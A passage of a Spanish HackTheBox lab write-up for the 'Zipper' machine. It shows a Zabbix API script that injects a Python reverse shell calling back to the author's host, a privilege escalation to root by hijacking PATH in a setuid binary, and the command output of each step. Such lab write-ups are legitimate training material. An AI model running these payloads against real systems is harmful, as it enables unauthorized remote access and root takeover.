+print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
+</code></pre>
+
+<p>Ahora tras ejecutarlo:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/zipper$ python3 get_revsh.py
+{'response': 'success', 'value': &quot;nc: invalid option -- 'e'\nusage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n\t  [-m minttl] [-O length] [-P proxy_username] [-p source_port]\n\t  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]\n\t  [-X proxy_protocol] [-x proxy_address[:port]] \t  [destination] [port]&quot;}
+</code></pre>
+
+<p>Esto nos indica que ha sido exitoso nuestro cambio de servidor a agente, porque como vemos la versión de netcat instalada en el agente, no soporta la opción -e. Aquí decidí cambiar a una python reverse shell, por lo que cambiamos la variable revshell:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pyzabbix import ZabbixAPI
+
+api_address=&quot;http://10.10.10.108/zabbix/api_jsonrpc.php&quot;
+
+user=&quot;zapper&quot;
+password=&quot;zapper&quot;
+hostname = &quot;Zipper&quot;
+hostid = &quot;10106&quot;
+
+zapi = ZabbixAPI(api_address)
+zapi.login(user, password)
+
+scriptid = &quot;&quot;
+
+revshell = &quot;python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.12.83\&quot;,3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);\'&quot;
+
+get_scripts = zapi.script.get(filter={&quot;host&quot;: hostname})
+for script in get_scripts:
+    if script['name'] == &quot;miau script&quot;:
+        scriptid = script['scriptid']
+        zapi.script.update(scriptid=scriptid, execute_on=&quot;0&quot;, command=revshell)
+
+if scriptid == &quot;&quot;:
+    scriptid = zapi.script.create(name='miau script', execute_on=&quot;0&quot;, command=revshell)['scriptids']
+
+print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
+</code></pre>
+
+<p>Volvemos a ejecutar y ahora tendremos una conexión hacia el listener de <code>ncat</code>:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~$ ncat -nlvp 3001
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::3001
+Ncat: Listening on 0.0.0.0:3001
+Ncat: Connection from 10.10.10.108.
+Ncat: Connection from 10.10.10.108:51910.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
+$ ls -lah /
+total 948M
+drwxr-xr-x  22 root   root   4.0K Sep  8 07:10 .
+drwxr-xr-x  22 root   root   4.0K Sep  8 07:10 ..
+drwxrwxrwx   2 zapper zapper 4.0K Jan 10 00:07 backups
+drwxr-xr-x   2 root   root   4.0K Sep  8 06:51 bin
+drwxr-xr-x   3 root   root   4.0K Sep  8 06:44 boot
+drwxr-xr-x  18 root   root   3.8K Jan  9 23:22 dev
+drwxr-xr-x  80 root   root   4.0K Oct  2 13:18 etc
+drwxr-xr-x   3 root   root   4.0K Sep  8 06:44 home
+lrwxrwxrwx   1 root   root     33 Sep  8 06:41 initrd.img -&gt; boot/initrd.img-4.15.0-33-generic
+lrwxrwxrwx   1 root   root     33 Sep  8 06:41 initrd.img.old -&gt; boot/initrd.img-4.15.0-33-generic
+drwxr-xr-x  20 root   root   4.0K Oct  2 13:18 lib
+drwx------   2 root   root    16K Sep  8 06:38 lost+found
+drwxr-xr-x   2 root   root   4.0K Sep  8 06:38 media
+drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 mnt
+drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 opt
+dr-xr-xr-x 145 root   root      0 Jan  9 23:22 proc
+drwx------   5 root   root   4.0K Sep  9 19:16 root
+drwxr-xr-x  21 root   root    640 Jan  9 23:22 run
+drwxr-xr-x   2 root   root   4.0K Oct  2 13:18 sbin
+drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 srv
+-rw-------   1 root   root   948M Sep  8 06:38 swapfile
+dr-xr-xr-x  13 root   root      0 Jan  9 23:33 sys
+drwxrwxrwt   9 root   root   4.0K Jan 10 00:09 tmp
+drwxr-xr-x  10 root   root   4.0K Sep  8 06:40 usr
+drwxr-xr-x  11 root   root   4.0K Sep  8 06:40 var
+lrwxrwxrwx   1 root   root     30 Sep  8 06:41 vmlinuz -&gt; boot/vmlinuz-4.15.0-33-generic
+lrwxrwxrwx   1 root   root     30 Sep  8 06:41 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-33-generic
+</code></pre>
+
+<h1 id="from-zabbix-to-root-a-k-a-privesc">from zabbix to root a.k.a. privesc</h1>
+
+<p>Exploramos un poco la máquina:</p>
+
+<pre><code class="language-text">$ ls /home
+zapper
+$ ls -lah /home/zapper
+total 48K
+drwxr-xr-x 6 zapper zapper 4.0K Sep  9 19:12 .
+drwxr-xr-x 3 root   root   4.0K Sep  8 06:44 ..
+-rw------- 1 zapper zapper    0 Sep  8 13:44 .bash_history
+-rw-r--r-- 1 zapper zapper  220 Sep  8 06:44 .bash_logout
+-rw-r--r-- 1 zapper zapper 4.6K Sep  8 13:41 .bashrc
+drwx------ 2 zapper zapper 4.0K Sep  8 06:45 .cache
+drwxrwxr-x 3 zapper zapper 4.0K Sep  8 13:13 .local
+-rw-r--r-- 1 zapper zapper  807 Sep  8 06:44 .profile
+-rw-rw-r-- 1 zapper zapper   66 Sep  8 13:13 .selected_editor
+drwx------ 2 zapper zapper 4.0K Sep  8 13:14 .ssh
+-rw------- 1 zapper zapper   33 Sep  9 19:07 user.txt
+drwxrwxr-x 2 zapper zapper 4.0K Sep  8 13:27 utils
+$ ls /home/zapper/utils
+backup.sh
+zabbix-service
+$ ls -lah /home/zapper/utils
+total 20K
+drwxrwxr-x 2 zapper zapper 4.0K Sep  8 13:27 .
+drwxr-xr-x 6 zapper zapper 4.0K Sep  9 19:12 ..
+-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
+-rwsr-sr-x 1 root   root   7.4K Sep  8 13:05 zabbix-service
+$ cat /home/zapper/utils/backup.sh
+#!/bin/bash
+#
+# Quick script to backup all utilities in this folder to /backups
+#
+/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/null
+echo $?
+</code></pre>
+
+<p>Hemos dado con un script que genera backups de la carpeta utils, extraigamos el contenido de ese backup.</p>
+
+<pre><code class="language-text">$ ls -lah /backups
+total 12K
+drwxrwxrwx  2 zapper zapper 4.0K Jan 10 00:07 .
+drwxr-xr-x 22 root   root   4.0K Sep  8 07:10 ..
+-rw-rw-r--  1 zapper zapper 3.0K Jan 10 00:00 zapper_backup-2019-01-10.7z
+$ base64 /backups/zapper_backup-2019-01-10.7z
+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
+</code></pre>
+
+<p>Creamos el archivo zapper_backup-2019-01-10.7z.b64 con el contenido anterior y decodeamos:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/zipper$ base64 -d zapper_backup-2019-01-10.7z.b64 &gt; zapper_backup-2019-01-10.7z
+xbytemx@laptop:~/htb/zipper$ 7z x -ozapper20190110 -pZippityDoDah zapper_backup-2019-01-10.7z
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 3004 bytes (3 KiB)
+
+Extracting archive: zapper_backup-2019-01-10.7z
+--
+Path = zapper_backup-2019-01-10.7z
+Type = 7z
+Physical Size = 3004
+Headers Size = 236
+Method = LZMA2:13 BCJ 7zAES
+Solid = -
+Blocks = 2
+
+Everything is Ok
+
+Files: 2
+Size:       7750
+Compressed: 3004
+xbytemx@laptop:~/htb/zipper$ cd zapper20190110/
+xbytemx@laptop:~/htb/zipper/zapper20190110$ ls
+backup.sh  zabbix-service
+</code></pre>
+
+<p>Veamos vía strings el contenido de zabbix-service:</p>
+
+<pre><code class="language-text">tdx
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+setuid
+puts
+stdin
+printf
+fgets
+strcspn
+system
+__cxa_finalize
+setgid
+strcmp
+__libc_start_main
+__stack_chk_fail
+GLIBC_2.1.3
+GLIBC_2.4
+GLIBC_2.0
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+Y[^]
+UWVS
+[^_]
+start or stop?:
+start
+systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent
+stop
+systemctl stop zabbix-agent
+[!] ERROR: Unrecognized Option
+;*2$&quot;
+GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7281
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+zabbix-service.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strcmp@@GLIBC_2.0
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+printf@@GLIBC_2.0
+strcspn@@GLIBC_2.0
+fgets@@GLIBC_2.0
+_edata
+__stack_chk_fail@@GLIBC_2.4
+__x86.get_pc_thunk.dx
+__cxa_finalize@@GLIBC_2.1.3
+__data_start
+setgid@@GLIBC_2.0
+puts@@GLIBC_2.0
+system@@GLIBC_2.0
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+stdin@@GLIBC_2.0
+_fp_hw
+__bss_start
+main
+setuid@@GLIBC_2.0
+__stack_chk_fail_local
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+</code></pre>
+
+<p>Importante, vemos declarada la función setuid(), vemos que hay llamadas a system(), inclusive se distinguen comandos de systemctl. Si reverseamos un poco el binario, veremos que se hace setuid(0), lo cual es consistente con los bits que tiene el binario <code>-rwsr-sr-x</code> de root:root.</p>
+
+<p>Al ejecutarlo veremos que falla en nuestra shell, por lo que hacemos un upgrade a bash:</p>
+
+<pre><code class="language-text">$ cd /home/zapper/utils
+$ ./zabbix-service
+start or stop?: [!] ERROR: Unrecognized Option
+$ printf &quot;start\n&quot; | ./zabbix-service
+start or stop?: $ id
+uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
+$ printf &quot;start&quot; | ./zabbix-service
+start or stop?: $
+$
+$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+zabbix@zipper:/home/zapper/utils$ ./zabbix-service
+./zabbix-service
+start or stop?: start
+start
+zabbix@zipper:/home/zapper/utils$
+</code></pre>
+
+<p>Ya que tenemos un mejor control sobre los pipes, podemos realizar una escalación de privilegios porque los comandos ejecutados desde el binario zabbix-service confían en la variable PATH, por lo que cambiando la variable PATH y suplantando el binario systemctl por cualquier cosa, podemos ejecutar cualquier cosa como root (gracias setuid 0). En este caso lo sustituimos por un script de bash:</p>
+
+<pre><code class="language-text">zabbix@zipper:/home/zapper/utils$ printf '#!/bin/bash\n\n/bin/bash -i' &gt; /tmp/systemctl
+&lt;intf '#!/bin/bash\n\n/bin/bash -i' &gt; /tmp/systemctl
+zabbix@zipper:/home/zapper/utils$ chmod +x /tmp/systemctl
+chmod +x /tmp/systemctl
+zabbix@zipper:/home/zapper/utils$ PATH=&quot;/tmp:$PATH&quot; ./zabbix-service
+PATH=&quot;/tmp:$PATH&quot; ./zabbix-service
+start or stop?: start
+start
+root@zipper:/home/zapper/utils# id
+id
+uid=0(root) gid=0(root) groups=0(root),113(zabbix)
+</code></pre>
+
+<h1 id="cat-root-txt-and-user-txt">cat root.txt and user.txt</h1>
+
+<p>&hellip; We got root flag and user flag.</p>
+
+<hr />
+
+<p>Gracias por llegar hasta aquí, hasta la próxima!</p>
+    </div>
+
+    
+    
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          
+          <a href="/tags/hackthebox/">hackthebox</a>
+          
+          <a href="/tags/htb/">htb</a>
+          
+          <a href="/tags/zabbix/">zabbix</a>
+          
+          <a href="/tags/rce/">rce</a>
+          
+          <a href="/tags/linux/">linux</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+        
+          <a class="next" href="/post/htb_writeup_-_giddy/">
+            <span class="next-text nav-default">HTB write-up: Giddy</span>
+            <span class="next-text nav-mobile">Siguiente</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'xbytemx';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://twitter.com/xbytemx" class="iconfont icon-twitter" title="twitter"></a>
+      <a href="https://github.com/xbytemx" class="iconfont icon-github" title="github"></a>
+  <a href="https://xbytemx.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Creado con <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Tema - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    
+      2018 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Tony Palma</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+<script src="/lib/highlight/highlight.pack.js?v=20171001"></script><script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>
+
+
+<script type="text/javascript" src="/dist/even.min.js?v=3.2.0"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
